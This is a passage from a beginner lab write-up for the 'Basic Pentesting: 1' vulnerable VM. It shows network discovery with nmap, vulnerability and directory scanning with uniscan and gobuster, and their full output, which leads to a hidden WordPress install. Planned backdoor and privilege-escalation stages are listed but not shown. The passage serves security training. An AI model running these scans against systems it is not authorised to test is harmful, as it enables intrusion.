<H1>Basic Pentesting: 1</H1>
<p></p>
<H2>What is it?</H2>
<p></p>
Basic Pentesting: 1 is a vulnerable VM that can be downloaded from <a href="https://www.vulnhub.com/entry/basic-pentesting-1,216/" rel="nofollow">VulnHub</a> so that you can host it locally. (To learn how to host this VM locally reference <a href="https://github.com/Shadow-Admins/Cyber_Club/tree/main/Starting_Point/VulnHub" rel="nofollow">here</a>)
<p></p>
Basic Pentesting: 1 is an easy to intermediate box, it contains no flags (you just need to achieve the highest privileges possible) and has different ways of completing the box to achieve the same outcome. Doing this box you will cover the following areas:
<p></p>

<H5>Enumeration</H5>
- Network Scanning (Nmap)
<H5>Web Recon</H5>
- Recon (gobuster,uniscan,wpscan)
<br>
<H5>Breaking into a badly configured login page</H5>
<br>
- WordPress password cracking (wpscan)
<H5>Gaining access through WordPress</H5>
- msf
<br>
- Using pre-configured php backdoor
<br>
- Upload and execute a backdoor
<H5>Catching the reverse conection on your host</H5>
- Reverse connection (Metasploit)
<br>
- netcat
<H5>Identifying and cracking a hash</H5>
- Getting a hash and decrypting it
<H5>Getting a TTY shell</H5>
- Import python one-liner for proper TTY shell
<H5>File Transfer</H5>
- python http server
<br>
- curl, wget
<H5>Privilege Escalation</H5>
- One liner, linPEAS,
<br>
- writeable passwd file
<br>
- creating user/pass
<H5>ftp exploit</H5>
<H5>User Access</H5>
- Cracking shadow password hash

<p></p>
There is no specific flag for this box the challenge is to achieve the highest privileges possible
<p></p>
I have written this write up as very beginner oriented with step-by-step walkthroughs to each stage of the process have a read you might learn something.
<p></p>
<H2>Walkthrough</H2>
<p></p>
<details>
    <summary></summary>
<p></p>
The first thing we need to do is identify the target VM on our network, (this is the mothod if you followed my guide for hosting the VM <a href="https://github.com/Shadow-Admins/Cyber_Club/tree/main/Starting_Point/VulnHub" rel="nofollow">here</a>)
<p></p>
In order to do that we need to identify what our Attacking VMs network adapter. By using the following command:
<p></p>

```
sudo ifconfig
```

<p></p>
Which outputs:
<p></p>

```
❯ sudo ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.191.129  netmask 255.255.255.0  broadcast 192.168.191.255
        inet6 fe80::11ec:b5d:f22:834f  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:df:18:d9  txqueuelen 1000  (Ethernet)
        RX packets 27524  bytes 26521537 (25.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 17283  bytes 2658776 (2.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.125.134  netmask 255.255.255.0  broadcast 192.168.125.255
        inet6 fe80::744b:c7cf:2382:75d3  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:df:18:e3  txqueuelen 1000  (Ethernet)
        RX packets 136  bytes 16130 (15.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 115  bytes 9578 (9.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 43920  bytes 8862323 (8.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 43920  bytes 8862323 (8.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

<p></p>
Here we can see the eth1 adapter, this is the adapter we added to the Host-only network. We will use the ip address given to this adapter to discover the Target VM on our network. We will use the following command:
<p></p>

```
nmap -e eth1 -T5 192.168.125.0/24
```

<p></p>
Looking at this command we used the <kbd>-e</kbd> flag to let nmap know which interface we want to use for the scan, the <kbd>-T5</kbd> flag tells nmap to do the fastest scan possible and the network we scanned against was the network we identified when we ran <kbd>ifconfig</kbd>.
<br>
This command returns:
<p></p>

```
❯ nmap -e eth1 -T5 192.168.125.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-11 12:40 AEST
Nmap scan report for 192.168.125.134
Host is up (0.048s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE
111/tcp open  rpcbind

Nmap scan report for 192.168.125.135
Host is up (0.048s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 256 IP addresses (2 hosts up) scanned in 19.50 seconds
```

<p></p>
Looking through the results we can identify our own ip address <kbd>192.168.125.134</kbd> and one other ip <kbd>192.168.125.135</kbd> we can therefore determine that the second ip is our target VM. Time for further enumeration with nmap. This time the command will look like this:
<p></p>

```
sudo nmap -e eth1 -A -vvv --script vuln -oN nmap.txt 192.168.125.135
```

<p></p>
For this command, we use the <kbd>-e</kbd> flag to direct nmap to our desired network interface, <kbd>-A</kbd> to run all scripts, <kbd>-vvv</kbd> to give very verbose output, <kbd>--script vuln</kbd> to run the vulnerability script against the machine, this is extremely helpful and does a lot of enumeration for us which we can see in the output, <kbd>-oN nmap.txt</kbd> outputs the scan to a text file se we can refer to it later and finally the ip address we wish to scan.
This command outputs the following:
<p></p>

```
# Nmap 7.91 scan initiated Sun Jul 11 12:44:35 2021 as: nmap -e eth1 -A -vvv --script vuln -oN nmap.txt 192.168.125.135
Nmap scan report for 192.168.125.135
Host is up, received arp-response (0.0045s latency).
Scanned at 2021-07-11 12:44:45 AEST for 458s
Not shown: 997 closed ports
Reason: 997 resets
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.3c
|_sslv2-drown: 
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /secret/: Potentially interesting folder
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
MAC Address: 00:0C:29:FB:93:05 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/11%OT=21%CT=1%CU=34941%PV=Y%DS=1%DC=D%G=Y%M=000C29%T
OS:M=60EA5CE7%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%II=I
OS:%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Uptime guess: 161.288 days (since Sun Jan 31 06:58:16 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   4.52 ms 192.168.125.135

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 11 12:52:23 2021 -- 1 IP address (1 host up) scanned in 468.00 seconds
```

<p></p>
What can we pull from this scan? We can see there are 3 ports open (port 21 running ftp, port 22 running ssh and port 80 running http) We can also see that the vuln script has enumerated a directory for us '/secret/'.
<p></p>
After doing these kinds of boxes a few times you will know that port 22 is rarely a way into the box so for now we will concentrate on the two other ports (21 and 80). (I am going to go over the process of gaining access via port 80 as this is the more difficult way to gain entry, I will cover getting in through port 21 after)
<p></p>
Prior to looking at these individually I will continue enumeration using some different tools. The first will be uniscan (one of my favourite tools).
<p></p>
Uniscan is a tool that comes prepackaged with both Parrot and kali, it has a simple GUI and is easy to use, you can find it here on Parrot.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/5b31f29ec8f6c04504fa101d14a1eb574bd9e3e5/Starting_Point/VulnHub/BasicPentesting1/images/uniscanloc.png"><br>
</div>
<p></p>
To use uniscan you enter the ip address you wish to scan and then check the options you want to use, I used the following options:
<br>
- Check Directory
<br>
- Check Files
<br>
- Check /robots.txt
<br>
- Dynamic tests
<br>
- Static tests
<br>
- Web Fingerprint
<br>
- Server Fingerprint
<p></p>
Uniscan creates a .html report in /usr/share/uniscan/reports/IPADDRESS.html
<p></p>
You can view this report by running:
<p></p>

```
firefox /usr/share/uniscan/reports/192.168.125.135 &
```

<p></p>
The report information (which you can view by clicking the 'open log file' button) is:

```
####################################
# Uniscan project                  #
# http://uniscan.sourceforge.net/  #
####################################
V. 6.3


Scan date: 11-7-2021 13:30:3
===================================================================================================
| Domain: http://192.168.125.135/
| Server: Apache/2.4.18 (Ubuntu)
| IP: 192.168.125.135
===================================================================================================
===================================================================================================
| Looking for Drupal plugins/modules
| 
| GET,HEAD,POST,OPTIONS
===================================================================================================
===================================================================================================
| WEB SERVICES
| 
===================================================================================================
| FAVICON.ICO
| 
===================================================================================================
| ERROR INFORMATION
| 
|  404 Not Found Not Found The requested URL /F&gt;]iB(j;4AIa{Nn[aR3 was not found on this server. Apache/2.4.18 (Ubuntu) Server at 192.168.125.135 Port 80 
|  404 Not Found Not Found The requested URL /L`8WUCxG0Z&gt;}b'4^^Qa6 was not found on this server. Apache/2.4.18 (Ubuntu) Server at 192.168.125.135 Port 80 
===================================================================================================
| TYPE ERROR
| 
===================================================================================================
| SERVER MOBILE
| 
===================================================================================================
| LANGUAGE
| 
===================================================================================================
| INTERESTING STRINGS IN HTML
| 
===================================================================================================
| WHOIS
| 
| 
| 
| #
| 
| # ARIN WHOIS data and services are subject to the Terms of Use
| 
| # available at: https://www.arin.net/resources/registry/whois/tou/
| 
| #
| 
| # If you see inaccuracies in the results, please report at
| 
| # https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
| 
| #
| 
| # Copyright 1997-2021, American Registry for Internet Numbers, Ltd.
| 
| #
| 
| 
| 
| 
| 
| NetRange:       192.168.0.0 - 192.168.255.255
| 
| CIDR:           192.168.0.0/16
| 
| NetName:        PRIVATE-ADDRESS-CBLK-RFC1918-IANA-RESERVED
| 
| NetHandle:      NET-192-168-0-0-1
| 
| Parent:         NET192 (NET-192-0-0-0-0)
| 
| NetType:        IANA Special Use
| 
| OriginAS:       
| 
| Organization:   Internet Assigned Numbers Authority (IANA)
| 
| RegDate:        1994-03-15
| 
| Updated:        2013-08-30
| 
| Comment:        These addresses are in use by many millions of independently operated networks, which might be as small as a single computer connected to a home gateway, and are automatically configured in hundreds of millions of devices.  They are only intended for use within a private context  and traffic that needs to cross the Internet will need to use a different, unique address.
| 
| Comment:        
| 
| Comment:        These addresses can be used by anyone without any need to coordinate with IANA or an Internet registry.  The traffic from these addresses does not come from ICANN or IANA.  We are not the source of activity you may see on logs or in e-mail records.  Please refer to http://www.iana.org/abuse/answers
| 
| Comment:        
| 
| Comment:        These addresses were assigned by the IETF, the organization that develops Internet protocols, in the Best Current Practice document, RFC 1918 which can be found at:
| 
| Comment:        http://datatracker.ietf.org/doc/rfc1918
| 
| Ref:            https://rdap.arin.net/registry/ip/192.168.0.0
| 
| 
| 
| 
| 
| 
| 
| OrgName:        Internet Assigned Numbers Authority
| 
| OrgId:          IANA
| 
| Address:        12025 Waterfront Drive
| 
| Address:        Suite 300
| 
| City:           Los Angeles
| 
| StateProv:      CA
| 
| PostalCode:     90292
| 
| Country:        US
| 
| RegDate:        
| 
| Updated:        2012-08-31
| 
| Ref:            https://rdap.arin.net/registry/entity/IANA
| 
| 
| 
| 
| 
| OrgAbuseHandle: IANA-IP-ARIN
| 
| OrgAbuseName:   ICANN
| 
| OrgAbusePhone:  +1-310-301-5820 
| 
| OrgAbuseEmail:  abuse@iana.org
| 
| OrgAbuseRef:    https://rdap.arin.net/registry/entity/IANA-IP-ARIN
| 
| 
| 
| OrgTechHandle: IANA-IP-ARIN
| 
| OrgTechName:   ICANN
| 
| OrgTechPhone:  +1-310-301-5820 
| 
| OrgTechEmail:  abuse@iana.org
| 
| OrgTechRef:    https://rdap.arin.net/registry/entity/IANA-IP-ARIN
| 
| 
| 
| 
| 
| #
| 
| # ARIN WHOIS data and services are subject to the Terms of Use
| 
| # available at: https://www.arin.net/resources/registry/whois/tou/
| 
| #
| 
| # If you see inaccuracies in the results, please report at
| 
| # https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
| 
| #
| 
| # Copyright 1997-2021, American Registry for Internet Numbers, Ltd.
| 
| #
| 
| 
| 
===================================================================================================
| BANNER GRABBING: 
===================================================================================================
===================================================================================================
| PING
| 
| PING 192.168.125.135 (192.168.125.135) 56(84) bytes of data.
| 64 bytes from 192.168.125.135: icmp_seq=1 ttl=64 time=0.399 ms
| 64 bytes from 192.168.125.135: icmp_seq=2 ttl=64 time=0.614 ms
| 64 bytes from 192.168.125.135: icmp_seq=3 ttl=64 time=0.519 ms
| 64 bytes from 192.168.125.135: icmp_seq=4 ttl=64 time=0.488 ms
| 
| --- 192.168.125.135 ping statistics ---
| 4 packets transmitted, 4 received, 0% packet loss, time 3079ms
| rtt min/avg/max/mdev = 0.399/0.505/0.614/0.076 ms
===================================================================================================
| TRACEROUTE
| 
| traceroute to 192.168.125.135 (192.168.125.135), 30 hops max, 60 byte packets
|  1  192.168.125.135 (192.168.125.135)  23.945 ms  24.235 ms  24.540 ms
===================================================================================================
| NSLOOKUP
| 
| Server:		192.168.191.2
| Address:	192.168.191.2#53
| 
| ** server can't find 135.125.168.192.in-addr.arpa: NXDOMAIN
===================================================================================================
| NMAP
| 
| Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-11 13:30 AEST
| NSE: Loaded 153 scripts for scanning.
| NSE: Script Pre-scanning.
| Initiating NSE at 13:30
| Completed NSE at 13:30, 0.00s elapsed
| Initiating NSE at 13:30
| Completed NSE at 13:30, 0.00s elapsed
| Initiating NSE at 13:30
| Completed NSE at 13:30, 0.00s elapsed
| Initiating ARP Ping Scan at 13:30
| Scanning 192.168.125.135 [1 port]
| Completed ARP Ping Scan at 13:30, 0.06s elapsed (1 total hosts)
| Initiating Parallel DNS resolution of 1 host. at 13:30
| Completed Parallel DNS resolution of 1 host. at 13:30, 6.51s elapsed
| Initiating SYN Stealth Scan at 13:30
| Scanning 192.168.125.135 [1000 ports]
| Discovered open port 21/tcp on 192.168.125.135
| Discovered open port 80/tcp on 192.168.125.135
| Discovered open port 22/tcp on 192.168.125.135
| Completed SYN Stealth Scan at 13:30, 1.24s elapsed (1000 total ports)
| Initiating Service scan at 13:30
| Scanning 3 services on 192.168.125.135
| Completed Service scan at 13:30, 10.02s elapsed (3 services on 1 host)
| Initiating OS detection (try #1) against 192.168.125.135
| NSE: Script scanning 192.168.125.135.
| Initiating NSE at 13:30
| Completed NSE at 13:30, 10.05s elapsed
| Initiating NSE at 13:30
| Completed NSE at 13:31, 28.07s elapsed
| Initiating NSE at 13:31
| Completed NSE at 13:31, 0.00s elapsed
| Nmap scan report for 192.168.125.135
| Host is up (0.0070s latency).
| Not shown: 997 closed ports
| PORT   STATE SERVICE VERSION
| 21/tcp open  ftp     ProFTPD 1.3.3c
| 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| | ssh-hostkey: 
| |   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
| |   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
| |_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
| 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| | http-methods: 
| |_  Supported Methods: GET HEAD POST OPTIONS
| |_http-server-header: Apache/2.4.18 (Ubuntu)
| |_http-title: Site doesn't have a title (text/html).
| MAC Address: 00:0C:29:FB:93:05 (VMware)
| Device type: general purpose
| Running: Linux 3.X|4.X
| OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
| OS details: Linux 3.2 - 4.9
| Uptime guess: 161.962 days (since Sat Jan 30 15:25:22 2021)
| Network Distance: 1 hop
| TCP Sequence Prediction: Difficulty=262 (Good luck!)
| IP ID Sequence Generation: All zeros
| Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
| 
| TRACEROUTE
| HOP RTT     ADDRESS
| 1   6.97 ms 192.168.125.135
| 
| NSE: Script Post-scanning.
| Initiating NSE at 13:31
| Completed NSE at 13:31, 0.00s elapsed
| Initiating NSE at 13:31
| Completed NSE at 13:31, 0.00s elapsed
| Initiating NSE at 13:31
| Completed NSE at 13:31, 0.00s elapsed
| Read data files from: /usr/bin/../share/nmap
| OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
| Nmap done: 1 IP address (1 host up) scanned in 57.92 seconds
|            Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.290KB)
===================================================================================================
|
| Directory check:
| [+] CODE: 200 URL: http://192.168.125.135/secret/
===================================================================================================
|                                                                                                   
| File check:
| [+] CODE: 200 URL: http://192.168.125.135/index.html
===================================================================================================
|
| Check robots.txt:
|
| Check sitemap.xml:
===================================================================================================
|
| Crawler Started:
| Plugin name: FCKeditor upload test v.1 Loaded.
| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
| Plugin name: Upload Form Detect v.1.1 Loaded.
| Plugin name: Code Disclosure v.1.1 Loaded.
| Plugin name: E-mail Detection v.1.1 Loaded.
| Plugin name: External Host Detect v.1.2 Loaded.
| Plugin name: phpinfo() Disclosure v.1 Loaded.
| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
| [+] Crawling finished, 7 URL's found!
|
| FCKeditor File Upload:
|
| Timthumb:
|
| File Upload Forms:
|
| Source Code Disclosure:
|
| E-mails:
|
| External hosts:
| [+] External Host Found: http://vtcsec
| [+] External Host Found: http://gmpg.org
| [+] External Host Found: https://wordpress.org
|
| PHPinfo() Disclosure:
|
| Web Backdoors:
|
| Ignored Files: 
===================================================================================================
| Dynamic tests:
| Plugin name: Learning New Directories v.1.2 Loaded.
| Plugin name: FCKedior tests v.1.1 Loaded.
| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
| Plugin name: Find Backup Files v.1.2 Loaded.
| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
| Plugin name: Local File Include tests v.1.1 Loaded.
| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
| Plugin name: Remote Command Execution tests v.1.1 Loaded.
| Plugin name: Remote File Include tests v.1.2 Loaded.
| Plugin name: SQL-injection tests v.1.2 Loaded.
| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
| Plugin name: Web Shell Finder v.1.3 Loaded.
| [+] 0 New directories added
|                                                                                                   
|                                                                                                   
| FCKeditor tests:
|                                                                                                   
|                                                                                                   
| Timthumb < 1.33 vulnerability:
|                                                                                                   
|                                                                                                   
| Backup Files:
|                                                                                                   
|                                                                                                   
| Blind SQL Injection:
|                                                                                                   
|                                                                                                   
| Local File Include:
|                                                                                                   
|                                                                                                   
| PHP CGI Argument Injection:
|                                                                                                   
|                                                                                                   
| Remote Command Execution:
|                                                                                                   
|                                                                                                   
| Remote File Include:
|                                                                                                   
|                                                                                                   
| SQL Injection:
|                                                                                                   
|                                                                                                   
| Cross-Site Scripting (XSS):
|                                                                                                   
|                                                                                                   
| Web Shell Finder:
===================================================================================================
| Static tests:
| Plugin name: Local File Include tests v.1.1 Loaded.
| Plugin name: Remote Command Execution tests v.1.1 Loaded.
| Plugin name: Remote File Include tests v.1.1 Loaded.
|                                                                                                   
|                                                                                                   
| Local File Include:
|                                                                                                   
|                                                                                                   
| Remote Command Execution:
|                                                                                                   
|                                                                                                   
| Remote File Include:
===================================================================================================
Scan end date: 11-7-2021 13:31:41



HTML report saved in: report/192.168.125.135.html
```

<p></p>
This provided us with a bit more information. It has enumerated a file for us and found 3 external hosts, it's interesting there is a reference to wordpress.
<p></p>

```
===================================================================================================
|
| Directory check:
| [+] CODE: 200 URL: http://192.168.125.135/secret/
===================================================================================================
|                                                                                                   
| File check:
| [+] CODE: 200 URL: http://192.168.125.135/index.html
===================================================================================================
|
| External hosts:
| [+] External Host Found: http://vtcsec
| [+] External Host Found: http://gmpg.org
| [+] External Host Found: https://wordpress.org
```

<p></p>
We will save this information for later, lets continue enumerating.
<p></p>
We will now use gobuster (gobuster -h displays the helpfile) to see if we can pick up anymore directories or files belonging to this website. The command we will use is:
<p></p>

```
gobuster dir -u http://192.168.125.135 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
```

<p></p>
In this command u can see we use the <kbd>dir</kbd> command followed by the <kbd>-u</kbd> command to point gobuster at the url, we then use the <kbd>-w</kbd> command to point gobuster to our desired wordlist. Here you can see I have used the raft-large-files.txt wordlist from <a href="https://github.com/danielmiessler/SecLists" rel="nofollow">SecLists</a>. (I strongly recommend downloading this git it contains tons of wordlists that can be used for multiple things)
<p></p>
This command outputs this:
<p></p>

```
❯ gobuster dir -u http://192.168.125.135 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.125.135
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/11 13:44:28 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 177]
/.htaccess            (Status: 403) [Size: 299]
/.                    (Status: 200) [Size: 177]
/.html                (Status: 403) [Size: 295]
/.php                 (Status: 403) [Size: 294]
/.htpasswd            (Status: 403) [Size: 299]
/.htm                 (Status: 403) [Size: 294]
/.htpasswds           (Status: 403) [Size: 300]
/.htgroup             (Status: 403) [Size: 298]
/wp-forum.phps        (Status: 403) [Size: 303]
/.htaccess.bak        (Status: 403) [Size: 303]
/.htuser              (Status: 403) [Size: 297]
/.htc                 (Status: 403) [Size: 294]
/.ht                  (Status: 403) [Size: 293]
/.htaccess.old        (Status: 403) [Size: 303]
/.htacess             (Status: 403) [Size: 298]
Progress: 25258 / 37043 (68.19%)              [ERROR] 2021/07/11 13:45:10 [!] parse "http://192.168.125.135/directory\t\te.g.": net/url: invalid control character in URL
                                               
===============================================================
2021/07/11 13:45:36 Finished
===============================================================
```

<p></p>
Interesting another reference to wordpress, lets re-run gobuster but include the '/secret/' directory in the url. The command looks like this:
<p></p>

```
gobuster dir -u http://192.168.125.135/secret/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
```

<p></p>
Which outputs:
<p></p>

```
❯ gobuster dir -u http://192.168.125.135/secret/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.125.135/secret/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/11 13:47:15 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 306]
/license.txt          (Status: 200) [Size: 19935]
/readme.html          (Status: 200) [Size: 7413] 
/wp-login.php         (Status: 200) [Size: 2261] 
/index.php            (Status: 301) [Size: 0] [--> http://192.168.125.135/secret/]
/wp-mail.php          (Status: 403) [Size: 2768]                                  
/wp-cron.php          (Status: 200) [Size: 0]                                     
/wp-settings.php      (Status: 500) [Size: 0]                                     
/wp-config.php        (Status: 200) [Size: 0]                                     
/wp-blog-header.php   (Status: 200) [Size: 0]                                     
/.html                (Status: 403) [Size: 302]                                   
/wp-links-opml.php    (Status: 200) [Size: 222]                                   
/.                    (Status: 301) [Size: 0] [--> http://192.168.125.135/secret/]
/wp-trackback.php     (Status: 200) [Size: 135]                                   
/xmlrpc.php           (Status: 405) [Size: 42]                                    
/.php                 (Status: 403) [Size: 301]                                   
/wp-load.php          (Status: 200) [Size: 0]                                     
/wp-signup.php        (Status: 302) [Size: 0] [--> http://vtcsec/secret/wp-login.php?action=register]
/.htpasswd            (Status: 403) [Size: 306]                                                      
/wp-activate.php      (Status: 302) [Size: 0] [--> http://vtcsec/secret/wp-login.php?action=register]
/.htm                 (Status: 403) [Size: 301]                                                      
/.htpasswds           (Status: 403) [Size: 307]                                                      
/.htgroup             (Status: 403) [Size: 305]                                                      
/wp-forum.phps        (Status: 403) [Size: 310]                                                      
/.htaccess.bak        (Status: 403) [Size: 310]                                                      
/.htuser              (Status: 403) [Size: 304]                                                      
/.ht                  (Status: 403) [Size: 300]                                                      
/.htc                 (Status: 403) [Size: 301]                                                      
/.htaccess.old        (Status: 403) [Size: 310]                                                      
/.htacess             (Status: 403) [Size: 305]                                                      
Progress: 25138 / 37043 (67.86%)                                                                    [ERROR] 2021/07/11 13:47:56 [!] parse "http://192.168.125.135/secret/directory\t\te.g.": net/url: invalid control character in URL
                                                                                                     
===============================================================
2021/07/11 13:48:26 Finished
===============================================================
```

<p></p>
Jackpot, we found the wordpress motherload we will definitely be targeting this as our way into the machine. If we re-run uniscan in the same way we re-ran gobuster we find some more information. Bellow is the output from adding '/secret/' to the end of the ip in uniscan.
<p></p>

```
####################################
# Uniscan project                  #
# http://uniscan.sourceforge.net/  #
####################################
V. 6.3


Scan date: 11-7-2021 13:52:7
===================================================================================================
| Domain: http://192.168.125.135/secret/
| Server: Apache/2.4.18 (Ubuntu)
| IP: 192.168.125.135
===================================================================================================
===================================================================================================
| Looking for Drupal plugins/modules
| 
| GET,HEAD,POST,OPTIONS
===================================================================================================
===================================================================================================
| WEB SERVICES
| 
===================================================================================================
| FAVICON.ICO
| 
===================================================================================================
| ERROR INFORMATION
| 
|  404 Not Found Not Found The requested URL /vcz16&quot;=ci$ee:Qj^}Jl was not found on this server. Apache/2.4.18 (Ubuntu) Server at 192.168.125.135 Port 80 
|  404 Not Found Not Found The requested URL /IIdO6.J$y4|!:fT|M;b&gt; was not found on this server. Apache/2.4.18 (Ubuntu) Server at 192.168.125.135 Port 80 
===================================================================================================
| TYPE ERROR
| 
===================================================================================================
| SERVER MOBILE
| 
===================================================================================================
| LANGUAGE
| 
| lang="en-US"
===================================================================================================
| INTERESTING STRINGS IN HTML
| 
| a href="http://vtcsec/secret/wp-login.php">Log in
===================================================================================================
| WHOIS
| 
| 
| 
| #
| 
| # ARIN WHOIS data and services are subject to the Terms of Use
| 
| # available at: https://www.arin.net/resources/registry/whois/tou/
| 
| #
| 
| # If you see inaccuracies in the results, please report at
| 
| # https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
| 
| #
| 
| # Copyright 1997-2021, American Registry for Internet Numbers, Ltd.
| 
| #
| 
| 
| 
| 
| 
| NetRange:       192.168.0.0 - 192.168.255.255
| 
| CIDR:           192.168.0.0/16
| 
| NetName:        PRIVATE-ADDRESS-CBLK-RFC1918-IANA-RESERVED
| 
| NetHandle:      NET-192-168-0-0-1
| 
| Parent:         NET192 (NET-192-0-0-0-0)
| 
| NetType:        IANA Special Use
| 
| OriginAS:       
| 
| Organization:   Internet Assigned Numbers Authority (IANA)
| 
| RegDate:        1994-03-15
| 
| Updated:        2013-08-30
| 
| Comment:        These addresses are in use by many millions of independently operated networks, which might be as small as a single computer connected to a home gateway, and are automatically configured in hundreds of millions of devices.  They are only intended for use within a private context  and traffic that needs to cross the Internet will need to use a different, unique address.
| 
| Comment:        
| 
| Comment:        These addresses can be used by anyone without any need to coordinate with IANA or an Internet registry.  The traffic from these addresses does not come from ICANN or IANA.  We are not the source of activity you may see on logs or in e-mail records.  Please refer to http://www.iana.org/abuse/answers
| 
| Comment:        
| 
| Comment:        These addresses were assigned by the IETF, the organization that develops Internet protocols, in the Best Current Practice document, RFC 1918 which can be found at:
| 
| Comment:        http://datatracker.ietf.org/doc/rfc1918
| 
| Ref:            https://rdap.arin.net/registry/ip/192.168.0.0
| 
| 
| 
| 
| 
| 
| 
| OrgName:        Internet Assigned Numbers Authority
| 
| OrgId:          IANA
| 
| Address:        12025 Waterfront Drive
| 
| Address:        Suite 300
